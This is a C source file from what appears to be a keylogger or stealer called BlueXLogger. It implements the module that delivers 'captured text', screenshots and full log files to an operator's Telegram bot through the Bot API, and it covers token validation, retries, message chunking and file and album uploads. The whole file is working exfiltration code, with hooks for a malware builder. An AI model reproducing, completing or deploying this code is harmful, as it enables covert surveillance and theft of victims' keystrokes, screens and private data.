/*============================================================================
 * BlueXLogger - src/common/bxl_telegram.c
 * Telegram Bot API delivery channel.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_common.h"
#include "bxl_telegram.h"
#include "bxl_http.h"
#include "bxl_util.h"

#include <stdlib.h>

#define BXL_TG_HOST  "api.telegram.org"
#define BXL_TG_PORT  443

/*==========================================================================
 * Stage names / config bridging
 *========================================================================*/
const wchar_t *bxl_telegram_stage_name(int stage)
{
    switch (stage) {
    case BXL_TG_STAGE_CONNECT:    return L"connect";
    case BXL_TG_STAGE_TLS:        return L"TLS";
    case BXL_TG_STAGE_SEND:       return L"send";
    case BXL_TG_STAGE_RESPONSE:   return L"response";
    case BXL_TG_STAGE_PARSE:      return L"reply parsing";
    case BXL_TG_STAGE_API:        return L"Bot API";
    case BXL_TG_STAGE_RATE_LIMIT: return L"rate limit";
    default:                      return L"not started";
    }
}

void bxl_telegram_config_from(const BxlConfig *cfg, BxlTelegramConfig *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    if (!cfg) return;

    bxl_str_copy(out->bot_token, sizeof(out->bot_token), cfg->tg_bot_token);
    bxl_str_copy(out->chat_id,   sizeof(out->chat_id),   cfg->tg_chat_id);

    out->timeout_ms       = 20000;
    out->max_attempts     = 3;
    out->retry_base_ms    = 2000;
    out->parse_html       = cfg->tg_parse_html ? 1 : 0;
    out->send_screenshots = cfg->tg_send_screenshots ? 1 : 0;
    out->full_log_file    = cfg->tg_full_log_file ? 1 : 0;

    bxl_str_copy(out->api_host, sizeof(out->api_host), BXL_TG_HOST);
    out->api_port = BXL_TG_PORT;

    bxl_hostname(out->client_name, sizeof(out->client_name));
}

/*==========================================================================
 * Token / chat-id shape checks
 *========================================================================*/
/*
 * A bot token is "<numeric bot id>:<35-ish chars of [A-Za-z0-9_-]>". The
 * check is deliberately structural rather than exhaustive: it catches the
 * two mistakes that actually happen - pasting the bot's @username, and
 * pasting a truncated token - without rejecting a future format change.
 */
int bxl_telegram_token_ok(const char *token)
{
    const char *p;
    int digits = 0;

    if (!token || !token[0]) return BXL_FALSE;

    for (p = token; *p >= '0' && *p <= '9'; p++) digits++;
    if (digits < 5 || digits > 20) return BXL_FALSE;
    if (*p != ':') return BXL_FALSE;
    p++;

    {
        size_t n = strlen(p);
        size_t i;
        if (n < 30 || n > 64) return BXL_FALSE;
        for (i = 0; i < n; i++) {
            char c = p[i];
            if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') || c == '_' || c == '-'))
                return BXL_FALSE;
        }
    }
    return BXL_TRUE;
}

/*
 * A chat id is either numeric (optionally negative, which is how groups and
 * supergroups are addressed) or "@channelusername".
 */
int bxl_telegram_chat_ok(const char *chat_id)
{
    const char *p;

    if (!chat_id || !chat_id[0]) return BXL_FALSE;
    if (strlen(chat_id) >= BXL_TG_MAX_CHATID) return BXL_FALSE;

    if (chat_id[0] == '@') {
        size_t n = strlen(chat_id + 1);
        size_t i;
        if (n < 5 || n > 32) return BXL_FALSE;   /* Telegram's own bounds */
        for (i = 0; i < n; i++) {
            char c = chat_id[1 + i];
            if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') || c == '_'))
                return BXL_FALSE;
        }
        return BXL_TRUE;
    }

    p = chat_id;
    if (*p == '-') p++;
    if (!*p) return BXL_FALSE;
    for (; *p; p++)
        if (*p < '0' || *p > '9') return BXL_FALSE;

    return BXL_TRUE;
}

/*
 * A redacted form of the token, safe to write to a log or show in the
 * builder. The bot id is not a secret on its own (it is visible in every
 * message link); the secret half is what must never be printed.
 */
void bxl_telegram_redact(const char *token, char *out, size_t out_cch);
void bxl_telegram_redact(const char *token, char *out, size_t out_cch)
{
    const char *colon;

    if (!out || !out_cch) return;
    out[0] = 0;
    if (!token || !token[0]) { StringCchCopyA(out, out_cch, "(empty)"); return; }

    colon = strchr(token, ':');
    if (!colon || (size_t)(colon - token) + 8 >= out_cch) {
        StringCchCopyA(out, out_cch, "(set)");
        return;
    }

    /* "<id>:AAAA..." - enough to tell two tokens apart, not enough to use.
     * The ellipsis is written as explicit UTF-8 bytes so the output does not
     * depend on how the compiler interpreted this source file. */
    {
        size_t idlen = (size_t)(colon - token);
        memcpy(out, token, idlen);
        StringCchPrintfA(out + idlen, out_cch - idlen, ":%.4s\xE2\x80\xA6", colon + 1);
    }
}

/*==========================================================================
 * Transport
 *========================================================================*/
/*
 * One Bot API call. Builds the request URL from the token, POSTs it and
 * parses the {"ok":...,"result":...} envelope.
 *
 * Returns BXL_TRUE when the API accepted the call. res->stage says where it
 * died otherwise, so the builder can distinguish "no network" from "the API
 * said no" without matching on English.
 */
static int tg_call(const BxlTelegramConfig *tc, const char *method,
                   const char *content_type,
                   const void *body, size_t body_len,
                   BxlTelegramResult *res)
{
    char              path[512];
    BxlHttpResponse   hr;
    int               api_ok = 0;

    memset(&hr, 0, sizeof(hr));

    res->stage = BXL_TG_STAGE_CONNECT;

    if (!bxl_telegram_token_ok(tc->bot_token)) {
        StringCchCopyA(res->error, sizeof(res->error),
                       "bot token is missing or malformed");
        res->stage = BXL_TG_STAGE_NONE;
        return BXL_FALSE;
    }

    /* The token goes in the path, exactly as the Bot API specifies. It is
     * never written to a log in this form. */
    if (StringCchPrintfA(path, sizeof(path), "/bot%s/%s",
                         tc->bot_token, method) < 0) {
        StringCchCopyA(res->error, sizeof(res->error), "method path too long");
        return BXL_FALSE;
    }

    res->stage = BXL_TG_STAGE_SEND;

    if (!bxl_http_post(tc->api_host[0] ? tc->api_host : BXL_TG_HOST,
                       tc->api_port > 0 ? tc->api_port : BXL_TG_PORT,
                       path, content_type, body, body_len,
                       tc->timeout_ms > 0 ? tc->timeout_ms : 20000, &hr)) {
        StringCchCopyA(res->error, sizeof(res->error), hr.error);
        res->stage = (strstr(hr.error, "TLS") != NULL) ? BXL_TG_STAGE_TLS
                                                       : BXL_TG_STAGE_CONNECT;
        bxl_http_response_free(&hr);
        return BXL_FALSE;
    }

    res->stage       = BXL_TG_STAGE_RESPONSE;
    res->http_status = hr.status;

    if (hr.status != 200) {
        /* Even an error reply carries a JSON body with a description. Use it
         * when present, because "429 Too Many Requests" is far less useful
         * than the API's own wording. */
        if (hr.body && hr.body_len) {
            char desc[512];
            if (bxl_json_get_string(hr.body, "description", desc, sizeof(desc)))
                StringCchCopyA(res->last_line, sizeof(res->last_line), desc);
            bxl_json_get_int(hr.body, "error_code", (long *)&res->api_code);
            if (hr.status == 429) {
                long ra = 0;
                if (bxl_json_get_int(hr.body, "retry_after", &ra) && ra > 0)
                    res->retry_after = (int)ra;
                res->stage = BXL_TG_STAGE_RATE_LIMIT;
            }
        }
        if (!res->last_line[0])
            StringCchPrintfA(res->last_line, sizeof(res->last_line),
                             "HTTP %d", hr.status);
        StringCchCopyA(res->error, sizeof(res->error), res->last_line);
        bxl_http_response_free(&hr);
        return BXL_FALSE;
    }

    res->stage = BXL_TG_STAGE_PARSE;

    if (!hr.body || !hr.body_len) {
        StringCchCopyA(res->error, sizeof(res->error), "empty reply from the Bot API");
        bxl_http_response_free(&hr);
        return BXL_FALSE;
    }

    if (!bxl_json_get_bool(hr.body, "ok", &api_ok)) {
        StringCchCopyA(res->error, sizeof(res->error),
                       "reply was not a Bot API envelope");
        bxl_http_response_free(&hr);
        return BXL_FALSE;
    }

    if (!api_ok) {
        long code = 0;
        char desc[512];

        desc[0] = 0;
        bxl_json_get_int(hr.body, "error_code", &code);
        bxl_json_get_string(hr.body, "description", desc, sizeof(desc));

        res->stage     = BXL_TG_STAGE_API;
        res->api_code  = (int)code;
        StringCchCopyA(res->last_line, sizeof(res->last_line),
                       desc[0] ? desc : "the Bot API rejected the call");
        StringCchCopyA(res->error, sizeof(res->error), res->last_line);

        /* 429 arrives inside a 200 envelope in some deployments, carrying the
         * backoff in parameters.retry_after. */
        if (code == 429) {
            long ra = 0;
            if (bxl_json_get_int(hr.body, "retry_after", &ra) && ra > 0)
                res->retry_after = (int)ra;
            res->stage = BXL_TG_STAGE_RATE_LIMIT;
        }
        bxl_http_response_free(&hr);
        return BXL_FALSE;
    }

    bxl_json_get_string(hr.body, "description", res->last_line,
                        sizeof(res->last_line));
    bxl_http_response_free(&hr);
    return BXL_TRUE;
}

int bxl_telegram_retryable(const BxlTelegramResult *res)
{
    if (!res) return BXL_FALSE;

    if (res->stage == BXL_TG_STAGE_RATE_LIMIT) return BXL_TRUE;
    if (res->stage == BXL_TG_STAGE_CONNECT ||
        res->stage == BXL_TG_STAGE_TLS ||
        res->stage == BXL_TG_STAGE_SEND)  return BXL_TRUE;

    if (res->http_status >= 500) return BXL_TRUE;

    /* A 4xx from the API means the request itself is wrong - a bad chat id,
     * a message that is too long, a token without permission. Retrying those
     * cannot help and would only burn the rate limit. */
    if (res->api_code == 429) return BXL_TRUE;

    return BXL_FALSE;
}

/*
 * tg_call with the retry policy applied. Backs off exponentially, honouring
 * retry_after when the API supplied one, because ignoring it turns a
 * temporary throttle into a longer one.
 */
static int tg_call_retry(const BxlTelegramConfig *tc, const char *method,
                         const char *content_type,
                         const void *body, size_t body_len,
                         BxlTelegramResult *res)
{
    bxl_u64 start = bxl_now_ms();
    int     attempt;
    int     attempts = tc->max_attempts > 0 ? tc->max_attempts : 1;

    res->attempts = 0;

    for (attempt = 0; attempt < attempts; attempt++) {
        res->attempts++;
        res->retry_after = 0;

        if (tg_call(tc, method, content_type, body, body_len, res)) {
            res->ok         = BXL_TRUE;
            res->elapsed_ms = (bxl_u32)(bxl_now_ms() - start);
            return BXL_TRUE;
        }

        if (attempt + 1 >= attempts) break;
        if (!bxl_telegram_retryable(res)) break;

        if (res->retry_after > 0) {
            Sleep((DWORD)res->retry_after * 1000u);
        } else {
            int delay = tc->retry_base_ms > 0 ? tc->retry_base_ms : 1000;
            int i;
            for (i = 0; i < attempt; i++) delay *= 2;
            if (delay > 30000) delay = 30000;
            Sleep((DWORD)delay);
        }
    }

    res->ok         = BXL_FALSE;
    res->elapsed_ms = (bxl_u32)(bxl_now_ms() - start);
    return BXL_FALSE;
}

/*==========================================================================
 * Escaping
 *========================================================================*/
/* JSON string escaping: only the three characters Telegram could confuse,
 * plus control characters, which must be escaped rather than dropped. */
static int json_escape(BxlBuf *out, const char *s, size_t len)
{
    size_t i;

    for (i = 0; i < len; i++) {
        unsigned char c = (unsigned char)s[i];

        switch (c) {
        case '"':  if (!bxl_buf_appends(out, "\\\"")) return BXL_FALSE; break;
        case '\\': if (!bxl_buf_appends(out, "\\\\")) return BXL_FALSE; break;
        case '\n': if (!bxl_buf_appends(out, "\\n"))  return BXL_FALSE; break;
        case '\r': if (!bxl_buf_appends(out, "\\r"))  return BXL_FALSE; break;
        case '\t': if (!bxl_buf_appends(out, "\\t"))  return BXL_FALSE; break;
        default:
            if (c < 0x20) {
                if (!bxl_buf_appendf(out, "\\u%04X", (unsigned)c))
                    return BXL_FALSE;
            } else if (!bxl_buf_appendc(out, (char)c)) {
                return BXL_FALSE;
            }
            break;
        }
    }
    return BXL_TRUE;
}

/*
 * HTML escaping for parse_mode=HTML. Telegram accepts only a small tag set
 * (<b> <i> <u> <s> <code> <pre> <a>) and rejects the message outright if a
 * stray '<' appears anywhere, so every byte of captured text has to be
 * neutralised before it is wrapped in tags.
 */
static int html_escape(BxlBuf *out, const char *s, size_t len)
{
    size_t i;

    for (i = 0; i < len; i++) {
        char c = s[i];
        if (c == '&') {
            if (!bxl_buf_appends(out, "&amp;")) return BXL_FALSE;
        } else if (c == '<') {
            if (!bxl_buf_appends(out, "&lt;")) return BXL_FALSE;
        } else if (c == '>') {
            if (!bxl_buf_appends(out, "&gt;")) return BXL_FALSE;
        } else if (!bxl_buf_appendc(out, c)) {
            return BXL_FALSE;
        }
    }
    return BXL_TRUE;
}

/*
 * Choose a cut point in already-escaped text at or before `limit`.
 *
 * Two constraints:
 *   - never split an entity ("&amp;" cut in half produces a literal "&am"
 *     and the whole message is rejected);
 *   - prefer a line break, because a digest cut mid-line reads as a bug.
 */
static size_t safe_cut(const char *s, size_t limit)
{
    size_t cut = limit;
    size_t i;

    /* Step back off a partial entity. */
    for (i = cut; i > 0; i--) {
        if (s[i - 1] == ';') break;                  /* complete entity ends here */
        if (s[i - 1] == '&') { cut = i - 1; break; }  /* unterminated: drop it */
    }

    /* Prefer the last newline in the window, if there is one reasonably far
     * in: cutting at the very first line would waste most of the budget. */
    for (i = cut; i > 0 && i > cut / 2; i--) {
        if (s[i - 1] == '\n') return i;
    }

    return cut;
}

/*==========================================================================
 * sendMessage
 *========================================================================*/
/* Send one already-escaped, already-sized HTML message. */
static int tg_send_html_once(const BxlTelegramConfig *tc, const char *html,
                             BxlTelegramResult *res)
{
    BxlBuf json;
    int    ok;

    if (!bxl_buf_init(&json, strlen(html) + 256)) {
        StringCchCopyA(res->error, sizeof(res->error), "out of memory");
        return BXL_FALSE;
    }

    bxl_buf_appends(&json, "{\"chat_id\":\"");
    if (tc->chat_id[0] == '@') {
        /* A public channel is addressed by username; the '@' itself belongs
         * in the value, so it is not stripped. */
    }
    json_escape(&json, tc->chat_id, strlen(tc->chat_id));
    bxl_buf_appends(&json, "\",\"disable_web_page_preview\":true");
    if (tc->parse_html)
        bxl_buf_appends(&json, ",\"parse_mode\":\"HTML\"");
    bxl_buf_appends(&json, ",\"text\":\"");
    json_escape(&json, html, strlen(html));
    bxl_buf_appends(&json, "\"}");

    ok = tg_call_retry(tc, "sendMessage", "application/json",
                       json.data, json.len, res);

    bxl_buf_free(&json);
    return ok;
}

/*
 * Send a body that may exceed the 4096-character limit, as however many
 * messages it takes.
 *
 * Every chunk is wrapped in its own complete <pre> block and carries its own
 * header, so a digest split across three messages still reads as three
 * self-describing units rather than three fragments of one.
 */
static int tg_send_chunked(const BxlTelegramConfig *tc,
                           const char *header, const char *body,
                           BxlTelegramResult *res)
{
    BxlBuf esc;
    size_t pos = 0;
    int    part = 0;
    size_t body_len;

    if (!bxl_buf_init(&esc, strlen(body) * 2 + 1024)) {
        StringCchCopyA(res->error, sizeof(res->error), "out of memory");
        return BXL_FALSE;
    }

    if (tc->parse_html) {
        if (!html_escape(&esc, body, strlen(body))) {
            bxl_buf_free(&esc);
            StringCchCopyA(res->error, sizeof(res->error), "out of memory");
            return BXL_FALSE;
        }
    } else {
        bxl_buf_appends(&esc, body);
    }
    body_len = esc.len;

    /* Reserve room for the header they add themselves. */
    {
        size_t budget = BXL_TG_MSG_LIMIT;
        size_t hdr_len = strlen(header);
        size_t over    = 64;    /* part counter + tags + rounding */

        if (tc->parse_html) over += 5;   /* <pre> </pre> */
        if (hdr_len + over + 256 >= budget) {
            bxl_buf_free(&esc);
            StringCchCopyA(res->error, sizeof(res->error),
                           "message header is too long");
            return BXL_FALSE;
        }
        budget -= (hdr_len + over);

        for (;;) {
            size_t take;
            BxlBuf msg;

            if (pos >= body_len) break;

            take = body_len - pos;
            if (take > budget) take = safe_cut(esc.data + pos, budget);
            if (take == 0) take = 1;    /* never stall */

            if (!bxl_buf_init(&msg, take + hdr_len + 128)) {
                bxl_buf_free(&esc);
                StringCchCopyA(res->error, sizeof(res->error), "out of memory");
                return BXL_FALSE;
            }

            bxl_buf_appendf(&msg, "%s", header);
            if (part > 0) bxl_buf_appendf(&msg, " (part %d)", part + 1);
            bxl_buf_appends(&msg, "\n");
            if (tc->parse_html) bxl_buf_appends(&msg, "<pre>");
            bxl_buf_append(&msg, esc.data + pos, take);
            if (tc->parse_html) bxl_buf_appends(&msg, "</pre>");

            if (!tg_send_html_once(tc, msg.data, res)) {
                bxl_buf_free(&msg);
                bxl_buf_free(&esc);
                return BXL_FALSE;
            }

            bxl_buf_free(&msg);
            pos += take;
            part++;
        }
    }

    bxl_buf_free(&esc);

    /* An empty body is legal but produces an empty bubble; send the header
     * alone so the operator sees that the digest fired and had nothing new. */
    if (part == 0) {
        BxlBuf msg;
        if (!bxl_buf_init(&msg, strlen(header) + 64)) {
            StringCchCopyA(res->error, sizeof(res->error), "out of memory");
            return BXL_FALSE;
        }
        bxl_buf_appendf(&msg, "%s\n(no new activity)", header);
        if (!tg_send_html_once(tc, msg.data, res)) {
            bxl_buf_free(&msg);
            return BXL_FALSE;
        }
        bxl_buf_free(&msg);
    }

    return BXL_TRUE;
}

int bxl_telegram_send_text(const BxlTelegramConfig *tc, const char *text,
                           BxlTelegramResult *res)
{
    if (!tc || !text || !res) return BXL_FALSE;
    memset(res, 0, sizeof(*res));
    /* The header is raw HTML only when HTML parse mode is on; otherwise the
     * tags would arrive in the chat as literal text. */
    return tg_send_chunked(tc, tc->parse_html ? "<b>BlueXLogger</b>"
                                              : "BlueXLogger", text, res);
}

/*==========================================================================
 * File uploads
 *========================================================================*/
/* Add the chat id and an optional caption to a multipart form. */
static int mp_common(BxlMultipart *mp, const BxlTelegramConfig *tc,
                     const char *caption, const char *caption_field)
{
    if (!bxl_mp_add_field(mp, "chat_id", tc->chat_id)) return BXL_FALSE;

    if (caption && caption[0]) {
        /* Captions are capped at 1024 characters. Truncating with an ellipsis
         * is friendlier than letting the API reject the whole upload. */
        char clipped[BXL_TG_CAPTION_LIMIT + 8];
        size_t n = strlen(caption);
        if (n > BXL_TG_CAPTION_LIMIT) {
            memcpy(clipped, caption, BXL_TG_CAPTION_LIMIT - 3);
            memcpy(clipped + BXL_TG_CAPTION_LIMIT - 3, "...", 3);
            n = BXL_TG_CAPTION_LIMIT;
        } else {
            memcpy(clipped, caption, n);
        }
        clipped[n] = 0;

        if (!bxl_mp_add_field(mp, caption_field, clipped)) return BXL_FALSE;
        if (tc->parse_html && !bxl_mp_add_field(mp, "parse_mode", "HTML"))
            return BXL_FALSE;
    }
    return BXL_TRUE;
}

int bxl_telegram_send_photo(const BxlTelegramConfig *tc, const BxlTgFile *file,
                            const char *caption, BxlTelegramResult *res)
{
    BxlMultipart *mp;
    size_t        len = 0;
    int           ok;

    if (!tc || !file || !file->data || !res) return BXL_FALSE;
    memset(res, 0, sizeof(*res));

    mp = bxl_mp_begin();
    if (!mp) { StringCchCopyA(res->error, sizeof(res->error), "out of memory"); return BXL_FALSE; }

    if (!mp_common(mp, tc, caption, "caption") ||
        !bxl_mp_add_file(mp, "photo", file->filename,
                         file->mime[0] ? file->mime : "image/jpeg",
                         file->data, file->len)) {
        bxl_mp_free(mp);
        StringCchCopyA(res->error, sizeof(res->error), "out of memory building the upload");
        return BXL_FALSE;
    }

    /* bxl_mp_data finalises the form (it appends the closing delimiter), so
     * the length is only known after the first call. */
    bxl_mp_data(mp, &len);
    ok = tg_call_retry(tc, "sendPhoto", bxl_mp_content_type(mp),
                       bxl_mp_data(mp, &len), len, res);

    bxl_mp_free(mp);
    return ok;
}

int bxl_telegram_send_document(const BxlTelegramConfig *tc, const BxlTgFile *file,
                               const char *caption, BxlTelegramResult *res)
{
    BxlMultipart *mp;
    size_t        len = 0;
    int           ok;

    if (!tc || !file || !file->data || !res) return BXL_FALSE;
    memset(res, 0, sizeof(*res));

    mp = bxl_mp_begin();
    if (!mp) { StringCchCopyA(res->error, sizeof(res->error), "out of memory"); return BXL_FALSE; }

    if (!mp_common(mp, tc, caption, "caption") ||
        !bxl_mp_add_file(mp, "document", file->filename,
                         file->mime[0] ? file->mime : "application/octet-stream",
                         file->data, file->len)) {
        bxl_mp_free(mp);
        StringCchCopyA(res->error, sizeof(res->error), "out of memory building the upload");
        return BXL_FALSE;
    }

    bxl_mp_data(mp, &len);
    ok = tg_call_retry(tc, "sendDocument", bxl_mp_content_type(mp),
                       bxl_mp_data(mp, &len), len, res);

    bxl_mp_free(mp);
    return ok;
}

int bxl_telegram_send_media_group(const BxlTelegramConfig *tc,
                                  const BxlTgFile *files, size_t count,
                                  const char *caption,
                                  BxlTelegramResult *res)
{
    BxlMultipart *mp;
    BxlBuf        media;
    size_t        i;
    size_t        len = 0;
    int           ok;

    if (!tc || !files || !res) return BXL_FALSE;
    if (count < BXL_TG_MEDIA_GROUP_MIN || count > BXL_TG_MEDIA_GROUP_MAX)
        return BXL_FALSE;

    memset(res, 0, sizeof(*res));

    mp = bxl_mp_begin();
    if (!mp) { StringCchCopyA(res->error, sizeof(res->error), "out of memory"); return BXL_FALSE; }
    if (!bxl_buf_init(&media, 512)) {
        bxl_mp_free(mp);
        StringCchCopyA(res->error, sizeof(res->error), "out of memory");
        return BXL_FALSE;
    }

    /* The album is described as JSON that references the multipart parts by
     * name ("attach://fileN"); the bytes travel alongside as those parts. */
    bxl_buf_appends(&media, "[");
    for (i = 0; i < count; i++) {
        char ref[32];
        StringCchPrintfA(ref, sizeof(ref), "attach://file%u", (unsigned)i);

        if (i) bxl_buf_appends(&media, ",");
        bxl_buf_appends(&media, "{\"type\":\"photo\",\"media\":\"");
        json_escape(&media, ref, strlen(ref));
        bxl_buf_appends(&media, "\"");

        /* Only the first item may carry the album caption. */
        if (i == 0 && caption && caption[0]) {
            char clipped[BXL_TG_CAPTION_LIMIT + 8];
            size_t n = strlen(caption);
            if (n > BXL_TG_CAPTION_LIMIT) {
                memcpy(clipped, caption, BXL_TG_CAPTION_LIMIT - 3);
                memcpy(clipped + BXL_TG_CAPTION_LIMIT - 3, "...", 3);
                n = BXL_TG_CAPTION_LIMIT;
            } else {
                memcpy(clipped, caption, n);
            }
            clipped[n] = 0;

            bxl_buf_appends(&media, ",\"caption\":\"");
            json_escape(&media, clipped, strlen(clipped));
            bxl_buf_appends(&media, "\"");
            if (tc->parse_html)
                bxl_buf_appends(&media, ",\"parse_mode\":\"HTML\"");
        }
        bxl_buf_appends(&media, "}");
    }
    bxl_buf_appends(&media, "]");

    if (!bxl_mp_add_field(mp, "chat_id", tc->chat_id) ||
        !bxl_mp_add_field(mp, "media", media.data)) {
        bxl_buf_free(&media);
        bxl_mp_free(mp);
        StringCchCopyA(res->error, sizeof(res->error), "out of memory building the album");
        return BXL_FALSE;
    }

    for (i = 0; i < count; i++) {
        char ref[32];
        StringCchPrintfA(ref, sizeof(ref), "file%u", (unsigned)i);
        if (!bxl_mp_add_file(mp, ref, files[i].filename,
                             files[i].mime[0] ? files[i].mime : "image/jpeg",
                             files[i].data, files[i].len)) {
            bxl_buf_free(&media);
            bxl_mp_free(mp);
            StringCchCopyA(res->error, sizeof(res->error), "out of memory building the album");
            return BXL_FALSE;
        }
    }

    bxl_mp_data(mp, &len);
    ok = tg_call_retry(tc, "sendMediaGroup", bxl_mp_content_type(mp),
                       bxl_mp_data(mp, &len), len, res);

    bxl_buf_free(&media);
    bxl_mp_free(mp);
    return ok;
}

/*==========================================================================
 * Verify (getMe)
 *========================================================================*/
int bxl_telegram_verify(const BxlTelegramConfig *tc, BxlTelegramResult *res)
{
    if (!tc || !res) return BXL_FALSE;
    memset(res, 0, sizeof(*res));

    /* getMe takes no parameters, but the Bot API is happy with an empty JSON
     * object and it keeps one code path for every call. */
    return tg_call_retry(tc, "getMe", "application/json", "{}", 2, res);
}

/*==========================================================================
 * Digest: text plus attachments
 *========================================================================*/
static int mime_is_image(const char *mime)
{
    return mime && strncmp(mime, "image/", 6) == 0;
}

static int mime_is_text(const char *mime)
{
    return mime && strncmp(mime, "text/", 5) == 0;
}

int bxl_telegram_send_digest(const BxlTelegramConfig *tc,
                             const char *subject,
                             const char *text,
                             const BxlTgFile *files, size_t file_count,
                             BxlTelegramResult *res)
{
    BxlBuf header;
    size_t i;
    int    all_ok = BXL_TRUE;

    if (!tc || !res) return BXL_FALSE;
    memset(res, 0, sizeof(*res));

    if (!bxl_buf_init(&header, 256)) {
        StringCchCopyA(res->error, sizeof(res->error), "out of memory");
        return BXL_FALSE;
    }

    if (subject && subject[0]) {
        BxlBuf esc;
        if (bxl_buf_init(&esc, strlen(subject) + 16)) {
            if (tc->parse_html) {
                html_escape(&esc, subject, strlen(subject));
                bxl_buf_appendf(&header, "<b>%s</b>", esc.data);
            } else {
                bxl_buf_appends(&header, subject);
            }
            bxl_buf_free(&esc);
        }
    } else {
        bxl_buf_appends(&header, tc->parse_html ? "<b>BlueXLogger</b>"
                                                : "BlueXLogger");
    }

    /* ---- the readable part --------------------------------------------- */
    if (!tg_send_chunked(tc, header.data, text ? text : "", res)) {
        bxl_buf_free(&header);
        return BXL_FALSE;
    }

    /* ---- the attachments ------------------------------------------------ */
    i = 0;
    while (i < file_count) {
        const BxlTgFile *f = &files[i];

        if (!f->data || f->len == 0) { i++; continue; }

        if (mime_is_text(f->mime)) {
            /* A text/plain document is what gives the operator the one-tap
             * in-app viewer, and the download button beside it. The bytes are
             * sent unmodified so the viewer sees the same content a download
             * would produce. */
            if (!bxl_telegram_send_document(tc, f, NULL, res)) {
                all_ok = BXL_FALSE;
                break;
            }
            i++;
            continue;
        }

        if (!mime_is_image(f->mime) || f->len > BXL_TG_PHOTO_MAX) {
            /* Not something Telegram will preview: send the original bytes
             * as a document rather than letting the API reject a photo. */
            if (!bxl_telegram_send_document(tc, f, NULL, res)) {
                all_ok = BXL_FALSE;
                break;
            }
            i++;
            continue;
        }

        /* Gather a run of consecutive images that are all small enough to be
         * photos, capped at the album size. */
        {
            size_t run = 0;
            while (i + run < file_count && run < BXL_TG_MEDIA_GROUP_MAX) {
                const BxlTgFile *g = &files[i + run];
                if (!g->data || g->len == 0) break;
                if (!mime_is_image(g->mime)) break;
                if (g->len > BXL_TG_PHOTO_MAX) break;
                run++;
            }

            if (run >= BXL_TG_MEDIA_GROUP_MIN) {
                if (!bxl_telegram_send_media_group(tc, &files[i], run,
                                                   NULL, res)) {
                    all_ok = BXL_FALSE;
                    break;
                }
                i += run;
            } else {
                if (!bxl_telegram_send_photo(tc, f, NULL, res)) {
                    all_ok = BXL_FALSE;
                    break;
                }
                i++;
            }
        }
    }

    bxl_buf_free(&header);
    res->ok = all_ok;
    return all_ok;
}
